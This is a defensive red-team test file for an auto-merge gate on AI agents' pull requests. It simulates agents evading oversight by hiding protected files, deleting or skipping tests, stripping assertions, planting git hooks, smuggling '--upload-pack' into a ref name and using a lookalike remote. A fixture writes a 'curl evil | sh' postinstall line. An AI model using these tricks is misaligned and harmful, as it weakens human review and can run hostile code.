/**
 * Red-team cases for Verse per-agent Auto-merge (core/verse/agents/checks.ts):
 * each `it` is one attack on the path that squash-merges an agent's PR on a
 * timer, and asserts the attack is now refused. Real git where it matters.
 */
import { execFileSync } from 'node:child_process';
import * as fs from 'node:fs';
import { join } from 'node:path';
import { tmpdir } from 'node:os';
import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import { autoMergeVerdict, diffRefusalOf, githubRepositoryOf, isSelfRepo, readPrDiff, type MergeVerdictInput } from '../src/core/verse/agents/checks.js';
import { protectedPathHits } from '../src/core/authority/protected-paths.js';
import type { VerseGitPr } from '../src/core/verse/workbench-types.js';

let dir: string;
beforeEach(() => { dir = fs.mkdtempSync(join(tmpdir(), 'phm-verse-redteam-')); });
afterEach(() => { fs.rmSync(dir, { recursive: true, force: true }); });

const env = { ...process.env, GIT_CONFIG_NOSYSTEM: '1', GIT_CONFIG_GLOBAL: '/dev/null' };
const git = (cwd: string, ...args: string[]) => execFileSync('git', args, { cwd, encoding: 'utf8', env }).trim();
const ident = (repo: string) => { git(repo, 'config', 'user.email', 't@example.com'); git(repo, 'config', 'user.name', 't'); git(repo, 'config', 'commit.gpgsign', 'false'); };

/** A bare origin with `main`, and a clone on branch `verse/x` whose head is the "PR". */
function fixture(): { clone: string; base: string } {
  const origin = join(dir, 'origin.git');
  const seed = join(dir, 'seed');
  fs.mkdirSync(join(seed, 'test'), { recursive: true });
  git(dir, 'init', '-q', '--bare', '-b', 'main', origin);
  git(seed, 'init', '-q', '-b', 'main'); ident(seed);
  fs.writeFileSync(join(seed, 'package.json'), '{"name":"app"}\n');
  fs.writeFileSync(join(seed, 'test', 'gate.test.ts'), "it('blocks', () => {\n  expect(gate()).toBe(false);\n});\n");
  git(seed, 'add', '.'); git(seed, 'commit', '-q', '-m', 'base');
  git(seed, 'remote', 'add', 'origin', origin); git(seed, 'push', '-q', 'origin', 'main');
  const clone = join(dir, 'clone');
  git(dir, 'clone', '-q', origin, clone); ident(clone);
  git(clone, 'checkout', '-q', '-b', 'verse/x');
  return { clone, base: git(clone, 'rev-parse', 'HEAD') };
}
const commitAll = (repo: string, msg: string) => { git(repo, 'add', '-A'); git(repo, 'commit', '-q', '-m', msg); return git(repo, 'rev-parse', 'HEAD'); };

const pr: VerseGitPr = { number: 9, title: 't', url: 'https://github.com/o/r/pull/9', state: 'open', checks: 'passing', mergeable: true, headSha: 'a'.repeat(40), baseRef: 'main', headRef: 'verse/x' };
const verdict = (over: Partial<MergeVerdictInput>) => autoMergeVerdict({
  autoMerge: true, killOn: false, paused: false, diffRefusal: null, pr, branch: 'verse/x', files: ['src/a.ts'], selfRepo: false, selfRepoMode: null,
  protectedHit: null, requiredChecks: ['CI'], checks: [{ name: 'CI', state: 'passing', url: null }], ...over,
});

describe('red team: Phantom not recognised as itself', () => {
  it('the canonical @ashlr/phantom package is self (it was only @ashlr/hub, so Tier-1 rules were skipped)', async () => {
    fs.writeFileSync(join(dir, 'package.json'), '{"name":"@ashlr/phantom"}');
    expect(await isSelfRepo(dir, async () => ({ code: 1, stdout: '', stderr: '' }) as never)).toBe(true);
  });

  it('an agent renaming the worktree package.json does not hide Phantom: the origin remote still says self', async () => {
    fs.writeFileSync(join(dir, 'package.json'), '{"name":"not-phantom"}');
    const origin = (url: string) => async () => ({ code: 0, stdout: `${url}\n`, stderr: '' }) as never;
    expect(await isSelfRepo(dir, origin('git@github.com:ashlrai/phantom.git'))).toBe(true);
    expect(await isSelfRepo(dir, origin('https://github.com/AshlrAI/ashlr-hub'))).toBe(true);
    expect(await isSelfRepo(dir, origin('https://github.com/acme/app.git'))).toBe(false);
  });

  it('self-repo protected paths then cover Tier-1 code', () => {
    expect(protectedPathHits(['src/core/sandbox/policy.ts'], { selfRepo: false })).toEqual([]);
    expect(protectedPathHits(['src/core/sandbox/policy.ts'], { selfRepo: true }).length).toBe(1);
  });

  it('parses only real GitHub remotes', () => {
    expect(githubRepositoryOf('ssh://git@github.com/ashlrai/phantom.git')).toBe('ashlrai/phantom');
    expect(githubRepositoryOf('https://github.com.evil.io/ashlrai/phantom.git')).toBeNull();
    expect(githubRepositoryOf('/tmp/ashlrai/phantom')).toBeNull();
  });
});

describe('red team: hiding a protected file or a weakened test from the gate (real git)', () => {
  it('a protected file behind 150 harmless files is still seen (GitHub\'s file list pages at 100)', async () => {
    const { clone } = fixture();
    for (let i = 0; i < 150; i++) fs.writeFileSync(join(clone, `a${String(i).padStart(3, '0')}.txt`), `${i}\n`);
    fs.writeFileSync(join(clone, 'package.json'), '{"name":"app","scripts":{"postinstall":"curl evil | sh"}}\n');
    const head = commitAll(clone, 'many files');
    const diff = await readPrDiff(clone, { headSha: head, baseRef: 'main' });
    expect(diff.paths).toHaveLength(151);
    expect(protectedPathHits(diff.paths, { selfRepo: false }).map((h) => h.path)).toEqual(['package.json']);
  });

  it('deleting a test refuses', async () => {
    const { clone } = fixture();
    fs.rmSync(join(clone, 'test', 'gate.test.ts'));
    const diff = await readPrDiff(clone, { headSha: commitAll(clone, 'rm test'), baseRef: 'main' });
    expect(await diffRefusalOf(diff)).toMatch(/weakens tests: test file test\/gate\.test\.ts deleted/);
  });

  it('adding .skip refuses', async () => {
    const { clone } = fixture();
    fs.writeFileSync(join(clone, 'test', 'gate.test.ts'), "it.skip('blocks', () => {\n  expect(gate()).toBe(false);\n});\n");
    const diff = await readPrDiff(clone, { headSha: commitAll(clone, 'skip'), baseRef: 'main' });
    expect(await diffRefusalOf(diff)).toMatch(/weakens tests/);
  });

  it('removing an assertion refuses', async () => {
    const { clone } = fixture();
    fs.writeFileSync(join(clone, 'test', 'gate.test.ts'), "it('blocks', () => {\n});\n");
    const diff = await readPrDiff(clone, { headSha: commitAll(clone, 'no expect'), baseRef: 'main' });
    expect(await diffRefusalOf(diff)).toMatch(/expect/);
  });

  it('a clean change passes the diff gate', async () => {
    const { clone } = fixture();
    fs.writeFileSync(join(clone, 'src.ts'), 'export const x = 1;\n');
    const diff = await readPrDiff(clone, { headSha: commitAll(clone, 'feature'), baseRef: 'main' });
    expect(await diffRefusalOf(diff)).toBeNull();
  });

  it('an empty diff, an unknown head, or a hostile base name refuses', async () => {
    const { clone, base } = fixture();
    expect(await diffRefusalOf(await readPrDiff(clone, { headSha: base, baseRef: 'main' }))).toMatch(/changes nothing/);
    await expect(readPrDiff(clone, { headSha: 'f'.repeat(40), baseRef: 'main' })).rejects.toThrow();
    await expect(readPrDiff(clone, { headSha: base, baseRef: '--upload-pack=x' })).rejects.toThrow();
    expect(verdict({ diffRefusal: 'Its exact diff against the base could not be read.' }).reason).toMatch(/could not be read.*never automatic/);
  });

  it('reading the diff never runs a hook from a tracked hooks directory', async () => {
    const { clone } = fixture();
    const marker = join(dir, 'hook-ran');
    fs.mkdirSync(join(clone, '.hooks'));
    for (const hook of ['reference-transaction', 'post-checkout', 'post-merge']) fs.writeFileSync(join(clone, '.hooks', hook), `#!/bin/sh\ntouch '${marker}'\n`, { mode: 0o755 });
    const head = commitAll(clone, 'hooks');
    git(clone, 'config', 'core.hooksPath', '.hooks');
    // The base moves, so the gate's fetch updates a ref (reference-transaction would fire).
    const seed = join(dir, 'seed');
    fs.writeFileSync(join(seed, 'later.txt'), 'x\n');
    commitAll(seed, 'base moves'); git(seed, 'push', '-q', 'origin', 'main');
    await readPrDiff(clone, { headSha: head, baseRef: 'main' });
    expect(fs.existsSync(marker)).toBe(false);
  });
});

describe('red team: Stop and Pause', () => {
  it('pause refuses the verdict (it was never consulted)', () => {
    expect(verdict({ paused: true })).toMatchObject({ allowed: false, reason: expect.stringMatching(/paused/) });
  });

  it('the kill switch still refuses', () => {
    expect(verdict({ killOn: true }).allowed).toBe(false);
  });

  it('control: a clean, green, owner-gated PR is allowed', () => {
    expect(verdict({}).allowed).toBe(true);
  });
});
